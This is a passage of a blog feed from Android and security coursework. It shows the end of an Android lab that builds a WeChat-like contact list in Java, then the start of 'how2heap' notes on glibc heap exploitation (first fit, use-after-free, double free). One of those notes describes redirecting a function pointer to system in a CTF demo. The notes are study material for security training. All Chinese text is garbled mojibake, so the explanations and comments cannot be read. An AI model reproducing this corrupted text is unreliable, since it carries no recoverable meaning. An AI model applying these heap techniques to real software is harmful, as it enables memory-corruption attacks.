class="hljs-string">"å®¶äºº"</span>,<span class="hljs-string">"å®¶äºº"</span>,<span class="hljs-string">"å®¶äºº"</span>,<span class="hljs-string">"å®¶äºº"</span>,<span class="hljs-string">"å®¶äºº"</span>,<span class="hljs-string">"å®¶äºº"</span>,<span class="hljs-string">"åŒå­¦"</span>};<br>        List&lt;Map&lt;String,Object&gt;&gt; items=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Map&lt;String,Object&gt;&gt;();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;names.length;i++){<br>            Map&lt;String,Object&gt; item=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>            item.put(<span class="hljs-string">"i_name"</span>,names[i]);<br>            item.put(<span class="hljs-string">"i_image"</span>,images[i]);<br>            item.put(<span class="hljs-string">"i_phone"</span>,phones[i]);<br>            item.put(<span class="hljs-string">"i_region"</span>,regions[i]);<br>            item.put(<span class="hljs-string">"i_tag"</span>,tags[i]);<br>            items.add(item);<br>        }<br>        <span class="hljs-comment">//åˆ›å»ºRecycleViewå®ä¾‹å’Œè®¾ç½®Adapter</span><br>        Context context=getContext();<br>        myAdapter=<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyAdapter</span>(items,context);<br>        LinearLayoutManager manager=<span class="hljs-keyword">new</span> <span class="hljs-title class_">LinearLayoutManager</span>(context);<br>        manager.setOrientation(recyclerView.VERTICAL);<br>        recyclerView.setLayoutManager(manager);<br>        recyclerView.setAdapter(myAdapter);<br>        <span class="hljs-keyword">return</span> view;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="2-2-Myadapater-å®ç°è·³è½¬æ“ä½œ"><a href="#2-2-Myadapater-å®ç°è·³è½¬æ“ä½œ" class="headerlink" title="2.2 Myadapater å®ç°è·³è½¬æ“ä½œ"></a>2.2 Myadapater å®ç°è·³è½¬æ“ä½œ</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mywork;<br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><span class="hljs-keyword">import</span> android.widget.ImageView;<br><span class="hljs-keyword">import</span> android.widget.LinearLayout;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResult;<br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResultCallback;<br><span class="hljs-keyword">import</span> androidx.activity.result.ActivityResultLauncher;<br><span class="hljs-keyword">import</span> androidx.activity.result.contract.ActivityResultContracts;<br><span class="hljs-keyword">import</span> androidx.annotation.NonNull;<br><span class="hljs-keyword">import</span> androidx.recyclerview.widget.RecyclerView;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RecyclerView</span>.Adapter &lt;MyAdapter.MyViewHolder&gt;{<br>    <span class="hljs-comment">//å®šä¹‰å­˜å‚¨æ•°æ®å’Œè¿è¡Œç¯å¢ƒçš„å˜é‡</span><br>    <span class="hljs-keyword">private</span> List&lt;Map&lt;String,Object&gt;&gt; mydata;<br>    <span class="hljs-keyword">private</span> Context mycontext;<br><br>    <span class="hljs-comment">//è·å–æ•°æ®å’Œè¿è¡Œç¯å¢ƒ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyAdapter</span><span class="hljs-params">(List&lt;Map&lt;String,Object&gt;&gt; data, Context context)</span>{<br>        mydata=data;<br>        mycontext=context;<br>    }<br><br>    <span class="hljs-meta">@NonNull</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> MyViewHolder <span class="hljs-title function_">onCreateViewHolder</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> ViewGroup parent, <span class="hljs-type">int</span> viewType)</span> {<br>        View view= LayoutInflater.from(mycontext).inflate(R.layout.fragment_txl,parent,<span class="hljs-literal">false</span>);<br>        MyViewHolder holder=<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyViewHolder</span>(view);<br>        <span class="hljs-keyword">return</span> holder;<br>    }<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> MyAdapter.MyViewHolder holder, <span class="hljs-type">int</span> position)</span> {<br>        String name=mydata.get(position).get(<span class="hljs-string">"i_name"</span>).toString();<br>        <span class="hljs-type">int</span> image=Integer.parseInt(mydata.get(position).get(<span class="hljs-string">"i_image"</span>).toString());<br>        <span class="hljs-comment">//è·å–è¯¦æƒ…é¡µé¢ä¸­æŸä¸ªè”ç³»äººçš„å¯¹åº”æ•°æ®</span><br>        String phone=mydata.get(position).get(<span class="hljs-string">"i_phone"</span>).toString();<br>        String region=mydata.get(position).get(<span class="hljs-string">"i_region"</span>).toString();<br>        String tag=mydata.get(position).get(<span class="hljs-string">"i_tag"</span>).toString();<br>        holder.textView.setText(name);<br>        holder.imageView.setImageResource(image);<br><br>        <span class="hljs-comment">//æ·»åŠ ç‚¹å‡»äº‹ä»¶</span><br>        holder.linearLayout_txl.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() {<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> {<br>                <span class="hljs-comment">//ç‚¹å‡»åè·³è½¬åˆ°è”ç³»äººè¯¦æƒ…é¡µ</span><br>                Intent intent=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(mycontext, txlDetails.class);<br><br>                <span class="hljs-comment">//ä½¿ç”¨bundleä¼ å€¼</span><br>                <span class="hljs-type">Bundle</span> <span class="hljs-variable">bundle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bundle</span>();<br>                bundle.putString(<span class="hljs-string">"details"</span>,name);<br>                bundle.putInt(<span class="hljs-string">"image"</span>, image);<br>                bundle.putString(<span class="hljs-string">"phone"</span>,phone);<br>                bundle.putString(<span class="hljs-string">"region"</span>,region);<br>                bundle.putString(<span class="hljs-string">"tag"</span>,tag);<br><br>                intent.putExtras(bundle);<br>                mycontext.startActivity(intent);<br>            }<br>        });<br>    }<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getItemCount</span><span class="hljs-params">()</span> {<br>        <span class="hljs-keyword">return</span> mydata.size();<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewHolder</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RecyclerView</span>.ViewHolder {<br>        <span class="hljs-keyword">public</span> LinearLayout linearLayout_txl;<br>        <span class="hljs-keyword">private</span> TextView textView;<br>        <span class="hljs-keyword">private</span> ImageView imageView;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyViewHolder</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> View itemView)</span> {<br>            <span class="hljs-built_in">super</span>(itemView);<br>            <span class="hljs-comment">//è·å–itemä¸­çš„æ§ä»¶id</span><br>            textView=itemView.findViewById(R.id.text_duihuakuang);<br>            imageView=itemView.findViewById(R.id.image_touxiang);<br>            linearLayout_txl=itemView.findViewById(R.id.linearLayout_txl);<br>        }<br><br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>è·³è½¬çš„å®ç°ä¸»è¦æ˜¯å¯¹äºLinearLayout_txl çš„ç‚¹å‡»åŠ¨ä½œå®ç°ä¸€ä¸ªç›‘å¬ï¼Œå…·ä½“æ“ä½œ Intent intent=new Intent(mycontext, txlDetails.class) <code>myContext</code>æ˜¯ä¸€ä¸ªä»£è¡¨å½“å‰Activityçš„ä¸Šä¸‹æ–‡å¯¹è±¡ã€‚<code>txlDetails.class</code>æ˜¯ç›®æ ‡Activityçš„ç±»åã€‚ç„¶åå°†æ•°æ®å‹ç¼©ç»‘å®šåˆ°bundleé‡Œé¢ï¼Œæ·»åŠ åˆ°intentï¼Œæœ€åè°ƒç”¨startActivity(intent) è¿›è¡Œè·³è½¬</p><h4 id="2-3-txlDetails"><a href="#2-3-txlDetails" class="headerlink" title="2.3 txlDetails"></a>2.3 txlDetails</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mywork;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.ImageView;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">txlDetails</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> {<br>    TextView dName,textView1,textView2,textView3;<br>    ImageView dImage;<br>    Button button_r;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_txl_details);<br>        <span class="hljs-comment">//è·å–ä¸Šä¸€ä¸ªActvityä¼ è¿‡æ¥çš„intent</span><br>        Intent intent=getIntent();<br>        dName=findViewById(R.id.textDetail);<br>        dImage=findViewById((R.id.imageDetail));<br>        <span class="hljs-comment">//æ ¹æ®intentè·å–å¾—åˆ°çš„æ•°æ®è®¾ç½®itemæ§ä»¶çš„å€¼</span><br>        dImage.setImageResource(intent.getIntExtra(<span class="hljs-string">"image"</span>,R.drawable.find));<br>        dName.setText(intent.getStringExtra(<span class="hljs-string">"details"</span>));<br>        textView1=findViewById(R.id.phone);<br>        textView2=findViewById(R.id.region2);<br>        textView3=findViewById(R.id.wxtag2);<br>        textView1.setText(intent.getStringExtra(<span class="hljs-string">"phone"</span>));<br>        textView2.setText(intent.getStringExtra(<span class="hljs-string">"region"</span>));<br>        textView3.setText(intent.getStringExtra(<span class="hljs-string">"tag"</span>));<br>        button_r=findViewById(R.id.returnButton);<br>        button_r.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() {<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view)</span> {<br>                Log.d(<span class="hljs-string">"fb"</span>,<span class="hljs-string">"button_r...."</span>);<br>                <span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>                setResult(<span class="hljs-number">777</span>,intent);<br>                finish();<br>            }<br>        });<br><br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>ç”¨äºæ¥å—æ¥è‡ªtxlFragmentä¼ è¿‡æ¥çš„æ•°æ®å¹¶æ˜¾ç¤ºæ•°æ®ï¼Œè®¾ç½®äº†è¿”å›buttonç”¨äºè¿”å›è‡³è·³è½¬å‰çš„Activity</p><h2 id="ç»“æœå±•ç¤º"><a href="#ç»“æœå±•ç¤º" class="headerlink" title="ç»“æœå±•ç¤º"></a>ç»“æœå±•ç¤º</h2><p class='item-img' data-src='https://s2.loli.net/2023/11/07/CImD2GeQHcdvFsE.gif'><img src="https://s2.loli.net/2023/11/07/CImD2GeQHcdvFsE.gif" alt="4.gif"></p><h2 id="ä»£ç ä»“åº“"><a href="#ä»£ç ä»“åº“" class="headerlink" title="ä»£ç ä»“åº“"></a>ä»£ç ä»“åº“</h2><p><a href="https://github.com/Kylinxin/MyWork">https://github.com/Kylinxin/MyWork</a></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>â€‹æœ¬æ¬¡å®ç°æˆ‘å®Œæˆäº†RecyclerViewçš„å®ç°ï¼Œæ˜ç™½äº†å¦‚ä½•å¯¹recyclerViewè¿›è¡Œä¼ å‚ï¼Œè®¾ç½®æ¯ä¸€é¡¹çš„å…·ä½“æ ·å­ã€‚åŒæ—¶å¯¹Activityè·³è½¬æœ‰äº†æ›´æ¸…æ™°çš„è®¤è¯†ï¼ŒstartActivity(intent);é€šè¿‡intentè®¾ç½®äº†è·³è½¬å¯¹è±¡ï¼Œè¿›è¡Œè·³è½¬ï¼Œè¿™ç§æ–¹æ³•ç®€å•ç›´è§‚ï¼Œä½†æ˜¯æ²¡åŠæ³•å¤„ç†è¿”å›å€¼ï¼Œè€ç‰ˆæœ¬çš„è§£å†³æ–¹æ³•æ˜¯é‡‡ç”¨æ–¹æ³•startActivityForResult()è¿›è¡Œè§£å†³ï¼Œä½†æ˜¯æœ‰è®¸å¤šå¼Šç«¯å’ŒRequestCodeéš¾ä»¥å¤„ç†ï¼Œæ–°ç‰ˆæœ¬ä¸­é‡‡ç”¨äº†registerForActivityResult()æ–¹æ³•é€šè¿‡åœ¨ä½¿ç”¨<code>registerForActivityResult()</code>æ–¹æ³•æ³¨å†ŒActivityResultContracts.StartActivityForResultæ—¶ï¼Œå¤„ç†å¯åŠ¨Activityå¹¶è·å–è¿”å›ç»“æœçš„é€»è¾‘ã€‚ActivityResultCallback<activityresult>æ˜¯ä¸€ä¸ªæ¥å£ï¼Œç”¨äºå¤„ç†<code>ActivityResultLauncher</code>çš„ç»“æœå›è°ƒã€‚å½“å¯åŠ¨çš„Activityç»“æŸå¹¶è¿”å›ç»“æœæ—¶ï¼Œå›è°ƒæ–¹æ³•ä¸­çš„<code>ActivityResult</code>å‚æ•°å°†åŒ…å«è¿”å›çš„ç»“æœä¿¡æ¯ã€‚æ€»çš„æ¥è¯´æ€è·¯éå¸¸æ¸…æ™°ï¼Œä½†æ˜¯æˆ‘ä¹Ÿå‘ç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯åœ¨myadaterä¸­æ— æ³•ä½¿ç”¨è¿™ç§æ–¹å¼è¿›è¡Œè·³è½¬ï¼Œåæ¥æŸ¥æ‰¾åŸå› ï¼ŒregisterForActivityResult()åªèƒ½åœ¨fragmentæˆ–activityä¸­æ‰èƒ½ä½¿ç”¨ã€‚è¿™æ¬¡æ”¶è·æ»¡æ»¡ï¼ŒåŠ æ·±äº†æˆ‘å¯¹recyclerViewçš„ä½¿ç”¨å’Œactivityé—´è·³è½¬çš„ç”¨æ³•å’Œå·®å¼‚ã€‚</activityresult></p><p>â€”â€” 2023.11.7</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ASç±»å¾®ä¿¡ç•Œé¢å¼€å‘&quot;&gt;&lt;a href=&quot;#ASç±»å¾®ä¿¡ç•Œé¢å¼€å‘&quot; class=&quot;headerlink&quot; title=&quot;ASç±»å¾®ä¿¡ç•Œé¢å¼€å‘&quot;&gt;&lt;/a&gt;ASç±»å¾®ä¿¡ç•Œé¢å¼€å‘&lt;/h1&gt;&lt;h2 id=&quot;åŠŸèƒ½è¦æ±‚&quot;&gt;&lt;a href=&quot;#åŠŸèƒ½è¦æ±‚&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="å®éªŒ" scheme="https://kylinxin.github.io/categories/%E5%AE%9E%E9%AA%8C/"/>
    
    
    <category term="ç§»åŠ¨å¼€å‘å®éªŒ" scheme="https://kylinxin.github.io/tags/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>how2heapæ¼æ´å’Œè§£æ</title>
    <link href="https://kylinxin.github.io/2023/10/31/how2heap%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%8E%9F%E7%90%86/"/>
    <id>https://kylinxin.github.io/2023/10/31/how2heap%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%8E%9F%E7%90%86/</id>
    <published>2023-10-31T15:14:29.000Z</published>
    <updated>2023-10-31T08:05:32.089Z</updated>
    
    <content type="html"><![CDATA[<h2 id="First-fit"><a href="#First-fit" class="headerlink" title="First fit"></a>First fit</h2><p><strong>åŸç†</strong></p><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs llvm">æ¼”ç¤ºglibc çš„åˆ†é…æœºåˆ¶<br>glibc ä½¿ç”¨é¦–æ¬¡é€‚åº”ç®—æ³•é€‰æ‹©ç©ºé—²çš„å †å—<br>å¦‚æœæœ‰ä¸€ä¸ªç©ºé—²å †å—ä¸”è¶³å¤Ÿå¤§ï¼Œé‚£ä¹ˆ <span class="hljs-keyword">malloc</span> å°†é€‰æ‹©å®ƒ<br>å¦‚æœå­˜åœ¨ use-after-<span class="hljs-keyword">free</span> çš„æƒ…å†µé‚£å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹æ€§<br>é¦–å…ˆç”³è¯·ä¸¤ä¸ªæ¯”è¾ƒå¤§çš„ chunk<br>ç¬¬ä¸€ä¸ª a <span class="hljs-operator">=</span> <span class="hljs-keyword">malloc</span>(<span class="hljs-number">0x512</span>) åœ¨: <span class="hljs-number">0x1682010</span><br>ç¬¬äºŒä¸ª b <span class="hljs-operator">=</span> <span class="hljs-keyword">malloc</span>(<span class="hljs-number">0x256</span>) åœ¨: <span class="hljs-number">0x1682530</span><br>æˆ‘ä»¬å¯ä»¥ç»§ç»­åˆ†é…å®ƒ<br>ç°åœ¨æˆ‘ä»¬æŠŠ <span class="hljs-string">"AAAAAAAA"</span> è¿™ä¸ªå­—ç¬¦ä¸²å†™åˆ° a é‚£é‡Œ <br>ç¬¬ä¸€æ¬¡ç”³è¯·çš„ <span class="hljs-number">0x1682010</span> æŒ‡å‘ AAAAAAAA<br>æ¥ä¸‹æ¥ <span class="hljs-keyword">free</span> æ‰ç¬¬ä¸€ä¸ª...<br>æ¥ä¸‹æ¥åªè¦æˆ‘ä»¬ç”³è¯·ä¸€å—å°äº <span class="hljs-number">0x512</span> çš„ chunkï¼Œé‚£å°±ä¼šåˆ†é…åˆ°åŸæœ¬ a é‚£é‡Œ: <span class="hljs-number">0x1682010</span><br>ç¬¬ä¸‰æ¬¡ <span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">malloc</span>(<span class="hljs-number">0x500</span>) åœ¨: <span class="hljs-number">0x1682010</span><br>æˆ‘ä»¬è¿™æ¬¡å¾€é‡Œå†™ä¸€ä¸² <span class="hljs-string">"CCCCCCCC"</span> åˆ°åˆšç”³è¯·çš„ <span class="hljs-keyword">c</span> ä¸­<br>ç¬¬ä¸‰æ¬¡ç”³è¯·çš„ <span class="hljs-keyword">c</span> <span class="hljs-number">0x1682010</span> æŒ‡å‘ CCCCCCCC<br>ç¬¬ä¸€æ¬¡ç”³è¯·çš„ a <span class="hljs-number">0x1682010</span> æŒ‡å‘ CCCCCCCC<br>å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶æˆ‘ä»¬åˆšåˆšçœ‹çš„æ˜¯ a çš„ï¼Œä½†å®ƒçš„å†…å®¹å´æ˜¯ <span class="hljs-string">"CCCCCCCC"</span><br></code></pre></td></tr></tbody></table></figure><p><strong>æ“ä½œ</strong></p><ul><li>å­˜åœ¨uafï¼Œé¦–å…ˆé‡Šæ”¾ä¸€ä¸ªå †å—p1ï¼Œé‡Œé¢æœ‰å†…å®¹</li><li>å†ç”³è¯·ä¸€ä¸ªç›¸åŒå¤§å°çš„å †å—p2</li><li>è¿™ä¸¤ä¸ªå †å—å®é™…ä¸ŠæŒ‡å‘åŒä¸€ä¸ªå†…å­˜åŒºåŸŸ</li></ul><p><strong>ç»“æœ</strong></p><p>è¿™ä¸¤ä¸ªå †å—å®é™…ä¸ŠæŒ‡å‘åŒä¸€ä¸ªå†…å­˜åŒºåŸŸ</p><h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p><strong>åŸç†</strong></p><figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs armasm">ç”³è¯·<span class="hljs-number">0x20</span>å¤§å°çš„å†…å­˜<span class="hljs-built_in">p1</span> çš„åœ°å€: <span class="hljs-number">0x1f11010</span><br>æŠŠ<span class="hljs-built_in">p1</span>[<span class="hljs-number">1</span>]èµ‹å€¼ä¸ºPrintfå‡½æ•°ï¼Œç„¶åæ‰“å°å‡º<span class="hljs-string">"Hello CTFshow"</span><br><span class="hljs-symbol">Hello</span> CTFshow<br><br><span class="hljs-symbol">free</span> æ‰ <span class="hljs-built_in">p1</span><br>å› ä¸ºå¹¶æ²¡æœ‰ç½®ä¸ºnullï¼Œæ‰€ä»¥<span class="hljs-built_in">p1</span>[<span class="hljs-number">1</span>]ä»ç„¶æ˜¯Printfå‡½æ•°ï¼Œä»ç„¶å¯ä»¥è¾“å‡ºæ‰“å°äº†<span class="hljs-string">"Hello CTFshow again"</span><br><span class="hljs-symbol">Hello</span> CTFshow again<br>æ¥ä¸‹æ¥å†å»mallocä¸€ä¸ª<span class="hljs-built_in">p2</span>ï¼Œä¼šæŠŠé‡Šæ”¾æ‰çš„<span class="hljs-built_in">p1</span>ç»™åˆ†é…å‡ºæ¥ï¼Œå¯ä»¥çœ‹åˆ°ä»–ä¿©æ˜¯åŒä¸€åœ°å€çš„<br><span class="hljs-symbol">p2</span> çš„åœ°å€: <span class="hljs-number">0x1f11010</span><br><span class="hljs-symbol">p1</span> çš„åœ°å€: <span class="hljs-number">0x1f11010</span><br>ç„¶åæŠŠ<span class="hljs-built_in">p2</span>[<span class="hljs-number">1</span>]ç»™æ”¹æˆdemoflagä¹Ÿå°±æ˜¯systemå‡½æ•°<br><br><span class="hljs-symbol">Then</span> <span class="hljs-meta">get</span> the flag &amp;&amp; enjoy <span class="hljs-keyword">it</span> !<br><br></code></pre></td></tr></tbody></table></figure><p><strong>æ“ä½œ</strong></p><ul><li>freeæ‰chunk1</li><li>å†ç”³è¯·ä¸€ä¸ªç›¸åŒå¤§å°çš„chunk2ï¼Œä¿®æ”¹å†…å®¹</li><li>å†ä½¿ç”¨chunk1ï¼Œä¼šè¾“å‡ºä¿®æ”¹å†…å®¹</li></ul><p><strong>ç»“æœ</strong></p><p>chunk1å’Œchunk2æ˜¯åŒä¸€ä¸ªchunk</p><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><p><strong>åŸç†</strong></p><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs llvm">æ¼”ç¤º fastbin çš„ <span class="hljs-keyword">double</span> <span class="hljs-keyword">free</span><br>é¦–å…ˆç”³è¯· <span class="hljs-number">3</span> ä¸ª chunk<br>ç¬¬ä¸€ä¸ª <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f010</span><br>ç¬¬äºŒä¸ª <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f030</span><br>ç¬¬ä¸‰ä¸ª <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f050</span><br><span class="hljs-keyword">free</span> æ‰ç¬¬ä¸€ä¸ª<br>å½“æˆ‘ä»¬å†æ¬¡ <span class="hljs-keyword">free</span> <span class="hljs-number">0x188f010</span> çš„æ—¶å€™<span class="hljs-punctuation">,</span> ç¨‹åºå°†ä¼šå´©æºƒå› ä¸º <span class="hljs-number">0x188f010</span> åœ¨ <span class="hljs-keyword">free</span> é“¾è¡¨çš„ç¬¬ä¸€ä¸ªä½ç½®ä¸Š<br>æˆ‘ä»¬å…ˆ <span class="hljs-keyword">free</span> <span class="hljs-number">0x188f030</span>.<br>ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥å†æ¬¡ <span class="hljs-keyword">free</span> <span class="hljs-number">0x188f010</span> äº†<span class="hljs-punctuation">,</span> å› ä¸ºä»–ç°åœ¨ä¸åœ¨ <span class="hljs-keyword">free</span> é“¾è¡¨çš„ç¬¬ä¸€ä¸ªä½ç½®ä¸Š<br>ç°åœ¨ç©ºé—²é“¾è¡¨æ˜¯è¿™æ ·çš„ [ <span class="hljs-number">0x188f010</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0x188f030</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0x188f010</span> ]. å¦‚æœæˆ‘ä»¬ <span class="hljs-keyword">malloc</span> ä¸‰æ¬¡<span class="hljs-punctuation">,</span> æˆ‘ä»¬ä¼šå¾—åˆ°ä¸¤æ¬¡ <span class="hljs-number">0x188f010</span> <br>ç¬¬ä¸€æ¬¡ <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0x188f010</span><br>ç¬¬äºŒæ¬¡ <span class="hljs-keyword">malloc</span>(<span 